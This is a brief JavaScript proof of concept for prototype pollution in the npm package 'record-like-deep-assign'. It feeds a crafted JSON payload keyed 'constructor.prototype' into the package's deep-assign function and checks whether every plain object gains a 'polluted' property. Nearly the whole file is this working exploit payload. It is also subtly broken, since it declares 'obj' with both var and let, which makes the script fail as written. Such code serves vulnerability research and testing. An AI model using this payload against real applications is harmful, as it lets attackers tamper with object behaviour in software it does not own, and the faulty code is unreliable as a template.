var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const deepAssign = require('record-like-deep-assign');
console.log({}.polluted);
let obj = {};
EVIL_JSON = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
deepAssign(obj, EVIL_JSON);
console.log({}.polluted);